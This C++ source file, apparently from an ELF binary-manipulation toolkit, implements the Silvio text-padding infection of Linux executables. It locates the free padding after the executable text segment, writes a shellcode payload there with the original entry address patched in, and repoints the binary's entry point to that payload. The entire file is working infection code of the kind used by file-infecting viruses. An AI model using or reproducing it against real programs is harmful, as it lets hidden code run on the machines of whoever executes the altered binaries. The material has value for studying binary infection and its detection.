#include "zkinjections.hh"
#include "zkexcept.hh"

/* API for Silvio text padding infection */

Injections::TextPaddingInfection::TextPaddingInfection(const char *target)
    :Elf(target), tpi_payload(nullptr), tpi_fake_entry(0), tpi_payload_sz(0)
{
    /* parsing original entry point address */
    char buf[ADDR_LEN];
    sprintf(buf, "%lx", elf_ehdr->e_entry);
    for(int i = 0; i < ADDR_LEN; i++){
        if(buf[i] >= 0x61 && buf[i] <= 0x66)
            tpi_org_entry[i] = buf[i] - 87;
        else if(buf[i] >= 0x30 && buf[i] <= 0x39)
            tpi_org_entry[i] = buf[i] - 48;
        else
            throw std::runtime_error("original entry point is weird\n");
    }
}

Injections::TextPaddingInfection::~TextPaddingInfection()
{
    if(tpi_payload)
        free(tpi_payload);
}

/* assumed payload is a heap allocated memory chunk */
void Injections::TextPaddingInfection::SetPayload(u8 *payload, size_t
        payload_sz)
{
    /*
     * total size of shellcode should be payload_sz - MAGIC_LEN + ADDR_LEN
     */
    tpi_payload_sz = payload_sz - MAGIC_LEN + ADDR_LEN;
    tpi_payload = realloc(payload, tpi_payload_sz * (sizeof(u8)));
    if(tpi_payload == nullptr)
        throw std::bad_alloc();
    return;
}

off_t Injections::TextPaddingInfection::FindFreeSpace(void)
{
    /* text segment has permission bits set to read and exec */
    int text_index = GetSegmentIndexbyAttr(PT_LOAD, PF_X | PF_R);
    assert(text_index != -1 && "text segment not found");

    /* data segment has permission bits set to read and write */
    int data_index = GetSegmentIndexbyAttr(PT_LOAD, PF_W | PF_R);
    assert(data_index != -1 && "data segment not found");

    assert(text_index + 1 == data_index);
    int available_space = elf_phdr[data_index].p_offset - elf_phdr[text_index]
        .p_offset;
    assert(available_space >= tpi_payload_sz && 
            "available free space is less than size");
    tpi_fake_entry = elf_phdr[text_index].p_vaddr + elf_phdr[
        text_index].p_memsz;
    return elf_phdr[text_index].p_offset + elf_phdr[text_index].
        p_filesz;
}

void Injections::TextPaddingInfection::InjectPayload(off_t writeoff, size_t size) 
    const
{
    try{
        Binary::PatchAddress((u8 *)tpi_payload, tpi_payload_sz, (u8 *)
                tpi_org_entry, (u8 *)tpi_magic);
    } catch (zkexcept::magic_not_found_error& e){
        std::cerr << e.what();
        std::exit(1);
    }

    ElfWrite((void *)tpi_payload, writeoff, size);
    SetEntryPoint((Addr)tpi_fake_entry);
    return;
}


